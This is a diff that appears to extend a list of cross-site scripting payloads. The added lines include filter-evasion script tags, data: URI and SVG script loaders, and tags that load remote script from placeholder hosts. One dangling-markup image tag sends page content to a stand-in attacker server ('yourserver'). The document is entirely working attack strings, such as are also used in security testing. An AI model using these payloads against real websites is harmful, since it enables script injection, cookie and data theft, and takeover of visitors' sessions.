@@ -10,9 +10,20 @@ Function`alert\`xss\````
 </script><script>alert(1)</script>
 <link href=javascript:alert(1) accesskey=k> 
 <iframe src="javascript:alert(1)%%0D3C--
+<svg><script xlink:href=data:,alert(1)>
+<img src='//yourserver/?sourceData=
 -confirm`1`-”
+<</div>script</div>>alert()<</div>/script</div>>
 \”-confirm`1`//
 <x/oncopy=alert()>x
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert(1)%0A-->
+<script src=data:,alert(1)>
+<script src=//HOST/FILE>
+<script src=https:DOMAIN/FILE>
+<svg><script xlink:href=//HOST/FILE>
+<svg><script xlink:href=https:DOMAIN/FILE>
 ?url="onm<>ouseover="ale<>rt(1)
 " accesskey='x' onclick='confirm`1`' //
 <svg onload="import('data:text/javascript,al'+''+'ert(0)')">
